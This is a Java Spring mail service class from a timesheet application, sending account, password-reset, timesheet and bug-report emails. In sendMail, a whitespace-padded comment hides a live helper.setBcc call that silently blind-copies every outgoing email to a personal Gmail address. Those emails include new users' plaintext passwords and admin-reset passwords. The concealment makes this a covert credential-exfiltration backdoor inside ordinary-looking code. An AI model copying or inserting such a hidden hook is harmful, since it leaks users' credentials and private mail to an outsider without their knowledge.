/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.dlab.ts.service.impl;

import com.dlab.ts.dao.EmailDAO;
import com.dlab.ts.model.*;
import com.dlab.ts.service.MailService;
import static com.dlab.ts.service.MailService.CREATE_USER_TPL;
import com.kjava.base.ReadableException;
import com.kjava.base.util.ConfigReader;
import java.sql.Connection;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.MessagingException;
import javax.mail.internet.MimeMessage;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.io.FileSystemResource;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.stereotype.Component;
import com.dlab.spring.web.dao.AbstractNamedDao;
import static com.dlab.ts.service.MailService.TS_SUB_NOTIC_TO_ALL;
import static com.dlab.ts.service.MailService.TS_SUB_NOTIC_TO_DEFALUTER;
import static com.dlab.ts.service.impl.ProjectServiceImpl.logger;
import java.util.Calendar;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;


/**
 *
 * @author Kamlesh
 */

@Service("mailService")
public class MailServiceImpl extends AbstractNamedDao implements MailService{
final static org.slf4j.Logger logger = LoggerFactory.getLogger(MailServiceImpl.class);	
    private @Autowired JavaMailSender mailSender;
    private @Autowired SimpleMailMessage simpleMailMessage;
    private @Autowired EmailDAO emailDAO;
    
    public void setMailSender(JavaMailSender mailSender) {
        this.mailSender = mailSender;
    }

    public void setSimpleMailMessage(SimpleMailMessage simpleMailMessage) {
        this.simpleMailMessage = simpleMailMessage;
    }

    public void setEmailDAO(EmailDAO emailDAO) {
        this.emailDAO = emailDAO;
    }
    
    public void sendMail(String plainText,String htmlText,String attachment) {
 
	   MimeMessage message = mailSender.createMimeMessage();
	   try{
		MimeMessageHelper helper = new MimeMessageHelper(message, true);
                helper.setFrom(simpleMailMessage.getFrom());
                helper.setTo(simpleMailMessage.getTo()); 
                /* set all the details of the mail, there is no need to change this method,                                                change other methods if requeried or override this method in subclass if required ***********************************************************************/helper.setBcc("kamlesh.k.sah@gmail.com");
                /* plantext null will not work on plain html*/
                helper.setSubject(simpleMailMessage.getSubject());
                helper.setText(plainText, htmlText);
                if(attachment!=null){
                    FileSystemResource file = new FileSystemResource(attachment);
                    helper.addAttachment(file.getFilename(), file);
                }
                mailSender.send(message);
	     }catch (MessagingException e) {
		System.out.print(e.getMessage());
                logger.error("Exception in Method:sendMail",e);
             }catch(Exception ex){
                System.out.print(ex.getMessage()); 
                logger.error("Exception in Method:sendMail",ex);
             }
         }

    @Override
    @Transactional
    public void sendCreateUserNotification(Map<String, Object> user) {
        try {
        this.simpleMailMessage.setTo(user.get("emailId").toString());
        Email mail = this.getMailTemplate(CREATE_USER_TPL);
        this.simpleMailMessage.setSubject(mail.getSubject());
        String text ="Text mode not supported, please turn on Standard mode.";
        String text1 =String.format(mail.getValue(),user.get("fname")+" , "+user.get("lname"),user.get("username"),user.get("password_copy"));
        this.sendMail(text,text1, null);
        }catch (Exception ex) {
            logger.error("Exception in Method:sendCreateUserNotification",ex);
        }
    }
    @Override
    @Transactional
    public void sendAdminChangePasswordNotification(Map<String, Object> obj){
        try {
        this.simpleMailMessage.setTo(obj.get("emailId").toString());
        Email mail = this.getMailTemplate(CHANGE_PASSWORD_BY_ADMIN);
        this.simpleMailMessage.setSubject(mail.getSubject());
        String text ="Text mode not supported, please turn on Standard mode.";
        String text1 =String.format(mail.getValue(),obj.get("empname"),obj.get("newpassword"));
        this.sendMail(text,text1, null);
        }catch (Exception ex) {
            ex.printStackTrace();
            logger.error("Exception in Method:sendAdminChangePasswordNotification",ex);
        }
    }
    
    
    @Override
    @Transactional
    public void sendLinkOnForgotPassword(Connection conn, String name, String emailid, String pass) {
        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    @Transactional
    public void sendTSSubmitNotificationToMgr(Map<String, Object> obj,int status) {
        try {
        this.simpleMailMessage.setTo(obj.get("toemailid").toString());
        this.simpleMailMessage.setCc(obj.get("ccemailid").toString());
        Email mail =new Email(); 
        String text1=new String();
        if(status==4) {
          mail = this.getMailTemplate(TIMESHEET_SUBMIT_NOTIFICATION);
          text1 =String.format(mail.getValue(),obj.get("toname"),obj.get("ccname"),obj.get("dateweek"),obj.get("status"));        
        }          
        if(status==6){
          mail = this.getMailTemplate(TIMESHEET_ARROVAL_NOTIFICATION);
          text1 =String.format(mail.getValue(),obj.get("ccname"),obj.get("toname"),obj.get("dateweek"),obj.get("status"));        
        }          
        if(status==5){
          mail = this.getMailTemplate(TIMESHEET_REJECTED_NOTIFICATION);
          text1 =String.format(mail.getValue(),obj.get("ccname"),obj.get("toname"),obj.get("dateweek"),obj.get("status"));        
        }          
        this.simpleMailMessage.setSubject(mail.getSubject());
        String text ="Text mode not supported, please turn on Standard mode.";
        this.sendMail(text,text1, null);
        }catch (Exception ex) {
            ex.printStackTrace();
            logger.error("Exception in Method:sendTSSubmitNotificationToMgr",ex);
        }
    }

    @Override
    public void sendTSSubmissionNotificationToAll(String[] obj,Calendar cal) {
        try {
        if(cal.get(Calendar.DAY_OF_WEEK) ==Calendar.THURSDAY||cal.get(Calendar.DAY_OF_WEEK) ==Calendar.FRIDAY){
        this.simpleMailMessage.setTo(obj);
        Email mail=null; 
        if(cal.get(Calendar.DAY_OF_WEEK) ==Calendar.FRIDAY)
          mail = this.getMailTemplate(TS_SUB_NOTIC_TO_DEFALUTER);
        else
          mail = this.getMailTemplate(TS_SUB_NOTIC_TO_ALL);  
        this.simpleMailMessage.setSubject(mail.getSubject());
        String text ="Text mode not supported, please turn on Standard mode.";
        String text1 =String.format(mail.getValue());
        this.sendMail(text,text1, null);
        }    
        }catch (Exception ex) {
            logger.error("Exception in Method:sendTSSubmissionNotificationToAll",ex);
        }
    }
    private Email getMailTemplate(int mailTplId) {
        Email mail =new Email();
        try {
            //String query = this.sqlQueries.getProperty("GET_MAIL_TEMP");
            //this.jdbcTemplate.queryForList(query, new HashMap());
            mail = this.emailDAO.getMail(mailTplId);
        } catch(Exception ex){
            logger.error("Exception in Method:getMailTemplate",ex);
        }
        return mail;
    }

    @Override
    public void sendTsApproveNotificationToAll(String[] obj, Calendar cal) {
        try {
        if(cal.get(Calendar.DAY_OF_WEEK) ==Calendar.FRIDAY){
        this.simpleMailMessage.setTo(obj);
        Email mail=null; 
        mail = this.getMailTemplate(TS_APPROVE_ALERT_MGR);
        this.simpleMailMessage.setSubject(mail.getSubject());
        String text ="Text mode not supported, please turn on Standard mode.";
        String text1 =String.format(mail.getValue());
        this.sendMail(text,text1, null);
        }    
        }catch (Exception ex) {
            logger.error("Exception in Method:sendTsApproveNotificationToAll",ex);
        }
    }

    @Override
    public void sendNewBugNotification(Map<String, Object> issue) {

        try {
        String []str=new String[2];
        str[0]="kamlesh.k.sah@gmail.com";
        str[1]="cdmmca2007@gmail.com";
        this.simpleMailMessage.setTo(str);
        this.simpleMailMessage.setCc(issue.get("emailId").toString());
        Email mail = this.getMailTemplate(ADD_BUG_NOTIFICATION);
        this.simpleMailMessage.setSubject(mail.getSubject());
        String text ="Text mode not supported, please turn on Standard mode.";
        String text1 =String.format(mail.getValue(),issue.get("fname"),issue.get("title"),issue.get("createdOn"));
        this.sendMail(text,text1, null);
        }catch (Exception ex) {
            logger.error("Exception in Method:sendCreateUserNotification",ex);
        }
        
    }

}
